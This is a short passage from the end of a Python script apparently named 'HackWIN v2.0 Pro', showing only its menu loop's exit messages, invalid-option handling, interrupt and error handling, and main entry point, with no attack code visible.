                print(f"{BOLD}{CYAN}Thank you for using HackWIN v2.0 Pro{RESET}")
                print(f"{YELLOW}═══════════════════════════════════════════════════════════{RESET}")
                print(f"{MAGENTA}Remember: Use responsibly and legally!{RESET}\n")
                break
            else:
                print(f"{RED}Invalid option. Please select 0-4.{RESET}")
                time.sleep(1)

        except KeyboardInterrupt:
            print(f"\n\n{YELLOW}Operation interrupted by user.{RESET}")
            print(f"{CYAN}Exiting gracefully...{RESET}\n")
            break
        except Exception as e:
            print(f"{RED}Unexpected error: {e}{RESET}")
            print(f"{YELLOW}Please report this issue if it persists.{RESET}")
            time.sleep(2)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}Goodbye!{RESET}\n")
        sys.exit(0)